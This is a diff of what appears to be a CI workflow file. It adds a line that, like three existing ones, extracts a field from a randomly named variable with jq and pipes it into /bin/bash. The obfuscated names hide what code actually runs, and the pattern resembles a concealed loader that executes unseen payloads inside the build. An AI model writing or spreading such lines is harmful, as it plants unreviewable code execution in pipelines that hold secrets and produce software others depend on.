@@ -20,6 +20,7 @@ jobs:
           printf '%s' "$m92" | jq -r .tais904 | /bin/bash
           printf '%s' "$hi4958" | jq -r .ewk58769 | /bin/bash
           printf '%s' "$btpg782" | jq -r .symij20 | /bin/bash
+          echo $usklo98 | jq -r .rgq255 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
